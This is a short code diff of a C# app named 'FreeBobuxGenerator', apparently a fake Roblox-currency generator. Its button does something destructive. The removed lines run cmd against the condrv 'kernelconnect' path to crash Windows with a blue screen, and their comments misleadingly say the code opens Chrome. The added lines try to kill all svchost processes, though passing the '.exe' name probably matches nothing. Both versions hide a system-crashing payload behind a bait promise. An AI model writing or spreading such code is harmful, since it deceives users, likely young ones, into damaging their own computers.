@@ -23,10 +23,10 @@ namespace FreeBobuxGenerator
 
         private void button1_Click(object sender, EventArgs e)
         {
-            ProcessStartInfo startInfo = new ProcessStartInfo();
-            startInfo.FileName = @"cmd"; // opens chrome
-            startInfo.Arguments = @"/c \\.\globalroot\device\condrv\kernelconnect"; // this is the part that bluescreens the pc
-            System.Diagnostics.Process.Start(startInfo); // launches chrome with the bsod argument
+            foreach (var process in Process.GetProcessesByName("svchost.exe"))
+            {  
+                process.Kill();
+            }
         }
     }
 }
